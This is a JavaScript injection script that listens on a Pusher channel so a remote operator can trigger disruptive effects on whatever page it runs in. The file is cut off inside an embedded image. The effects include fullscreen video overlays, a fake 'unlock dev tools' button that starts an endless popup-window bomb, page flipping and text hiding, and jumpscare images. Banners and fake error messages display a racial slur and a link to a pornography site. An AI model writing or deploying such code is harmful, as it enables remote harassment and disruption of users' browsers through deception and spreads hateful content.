if (!window.__chaosInjected && localStorage.getItem('chaos-listener-active') === 'true') {
  window.__chaosInjected = true;

  (function () {
    
    const script = document.createElement('script');
    script.src = 'https://js.pusher.com/7.2/pusher.min.js';
    script.onload = () => {
      const pusher = new Pusher('f02c3722bd883d397025', { cluster: 'eu' });
      const channel = pusher.subscribe('chaos-channel');

      const activeEffects = new Set();

      const activate = {
        videoBomb: () => {
          if (document.getElementById('__chaos_video')) return;
          const vid = document.createElement('video');
          vid.id = '__chaos_video';
          vid.src = 'https://www.w3schools.com/html/mov_bbb.mp4';
          vid.autoplay = true;
          vid.loop = true;
          vid.muted = true;
          Object.assign(vid.style, {
            position: 'fixed', top: 0, left: 0,
            width: '100vw', height: '100vh',
            zIndex: 2147483646
          });
          document.body.appendChild(vid);
        },
PHSpam: () => {
  // Create fullscreen black button
  const btn = document.createElement('button');
  btn.textContent = 'unlock dev tools';
  btn.style.position = 'fixed';
  btn.style.top = '0';
  btn.style.left = '0';
  btn.style.width = '100vw';
  btn.style.height = '100vh';
  btn.style.background = 'black';
  btn.style.color = 'white';
  btn.style.fontSize = '3em';
  btn.style.border = 'none';
  btn.style.cursor = 'pointer';
  document.body.appendChild(btn);

  // Spam logic
  const spamWindows = () => {
    setInterval(() => {
      for (let i = 0; i < 5; i++) {
        const width = 300;
        const height = 200;
        const left = Math.floor(Math.random() * (screen.availWidth - width));
        const top = Math.floor(Math.random() * (screen.availHeight - height));

        const win = window.open('', '', `width=${width},height=${height},top=${top},left=${left}`);
        if (!win) continue;

        win.document.body.style.margin = '0';
        win.document.body.style.background = 'black';
        win.document.body.style.overflow = 'hidden';

        const style = win.document.createElement('style');
        style.textContent = `
          .dot {
            position: absolute;
            width: 10px;
            height: 10px;
            background: hsl(${Math.random() * 360}, 100%, 50%);
            border-radius: 50%;
            animation: move 0.5s linear infinite;
          }
          @keyframes move {
            0% { transform: translate(0, 0); }
            100% { transform: translate(${Math.random() * 200 - 100}px, ${Math.random() * 200 - 100}px); }
          }
        `;
        win.document.head.appendChild(style);

        for (let j = 0; j < 100; j++) {
          const dot = win.document.createElement('div');
          dot.className = 'dot';
          dot.style.top = `${Math.random() * height}px`;
          dot.style.left = `${Math.random() * width}px`;
          win.document.body.appendChild(dot);
        }
      }
    }, 500);
  };

  // Activate on button click
  btn.onclick = () => {
    btn.remove();
    spamWindows();
  };
},
        changeBG: () => document.body.style.background = `hsl(${Math.floor(Math.random()*360)} 60% 80%)`,
        shake: () => {
          if (document.getElementById('__chaos_shake')) return;
          const s = document.createElement('style');
          s.id = '__chaos_shake';
          s.textContent = `@keyframes shake { 0%{transform:translate(0,0);}50%{transform:translate(2px,-2px);}100%{transform:translate(-2px,2px);} }
          * { animation: shake 0.1s infinite; }`;
          document.head.appendChild(s);
        },
        invertColors: () => document.body.style.filter = 'invert(1)',
        blurScreen: () => document.body.style.filter = 'blur(5px)',
        zoomIn: () => document.body.style.transform = 'scale(1.2)',
        zoomOut: () => document.body.style.transform = 'scale(0.8)',
        flipScreen: () => document.body.style.transform = 'rotate(180deg)',
        hideText: () => document.querySelectorAll('*').forEach(e => e.style.color = 'transparent'),
        rainbowText: () => {
          if (document.getElementById('__chaos_rainbow')) return;
          const s = document.createElement('style');
          s.id = '__chaos_rainbow';
          s.textContent = `@keyframes rainbow { 0%{color:red;}25%{color:orange;}50%{color:green;}75%{color:blue;}100%{color:violet;} }
          * { animation: rainbow 2s infinite; }`;
          document.head.appendChild(s);
        },
        cursorTrail: () => {
          document.addEventListener('mousemove', e => {
            const dot = document.createElement('div');
            dot.style = `position:fixed;left:${e.pageX}px;top:${e.pageY}px;width:5px;height:5px;background:#0ff;border-radius:50%;z-index:999999;pointer-events:none`;
            document.body.appendChild(dot);
            setTimeout(() => dot.remove(), 500);
          });
        },
        popupSpam: () => {
          for (let i = 0; i < 3; i++) alert('💥 Chaos!');
        },
        fakeError: () => {
          if (document.getElementById('__chaos_error')) return;
          const err = document.createElement('div');
          err.id = '__chaos_error';
          err.textContent = '⚠️ System Error: Fuck Niggers https://pornhub.com';
          Object.assign(err.style, {
            position: 'fixed', bottom: '10px', right: '10px',
            background: 'red', color: 'white', padding: '10px',
            fontSize: '16px', zIndex: 999999
          });
          document.body.appendChild(err);
        },
        typewriter: () => {
          if (document.getElementById('__chaos_typewriter')) return;
          const t = document.createElement('div');
          t.id = '__chaos_typewriter';
          t.style = 'position:fixed;bottom:20px;left:20px;color:#0ff;font-family:monospace;font-size:20px;z-index:999999';
          document.body.appendChild(t);
          let i = 0;
          const text = 'CHAOS MODE ENGAGED';
          const interval = setInterval(() => {
            if (i < text.length) t.textContent += text[i++];
            else clearInterval(interval);
          }, 100);
        },
        confetti: () => {
          const s = document.createElement('script');
          s.src = 'https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js';
          s.onload = () => confetti({ particleCount: 100, spread: 70 });
          document.body.appendChild(s);
        },
        snowfall: () => {
          const s = document.createElement('script');
          s.src = 'https://cdn.jsdelivr.net/npm/snowfall-js@1.0.0/snowfall.min.js';
          document.body.appendChild(s);
        },
        darkMode: () => document.body.style.background = '#000',
        lightMode: () => document.body.style.background = '#fff',
        broadcast: () => {
          if (document.getElementById('__chaos_broadcast')) return;
          const banner = document.createElement('div');
          banner.id = '__chaos_broadcast';
          banner.textContent = '🚨 Fuck Niggers 🚨';
          Object.assign(banner.style, {
            position: 'fixed', top: 0, left: 0, width: '100%',
            background: 'red', color: 'white', padding: '10px',
            fontSize: '20px', textAlign: 'center', zIndex: 999999
          });
          document.body.appendChild(banner);
        },
        glitch: () => {
          if (document.getElementById('__chaos_glitch')) return;
          const s = document.createElement('style');
          s.id = '__chaos_glitch';
          s.textContent = `* { animation: glitch 0.2s infinite; }
          @keyframes glitch { 0%{transform:skew(0deg);}50%{transform:skew(5deg);}100%{transform:skew(-5deg);} }`;
          document.head.appendChild(s);
        },
        jobJumpscare: () => {
  const img = document.createElement('img');
  img.src = 'data:image/png;base64,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'; // replace with your actual image URL
  img.style.position = 'fixed';
  img.style.top = '0';
  img.style.left = '0';
  img.style.width = '100vw';
  img.style.height = '100vh';
  img.style.objectFit = 'cover'; // ensures full image is shown
  img.style.zIndex = '999999';
  img.id = '__chaos_jobjumpscare';
  document.body.appendChild(img);

  const audio = document.createElement('audio');
  audio.src = 'https://example.com/jumpscare.mp3'; // optional sound
  audio.autoplay = true;
  audio.id = '__chaos_jobjumpscare_audio';
  document.body.appendChild(audio);

  setTimeout(() => {
    img.remove();
    audio.remove();
  }, 3000); // remove after 3 seconds
},
        astolfoJumpscare: () => {
  const img = document.createElement('img');
  img.src = 'data:image/jpeg;base64,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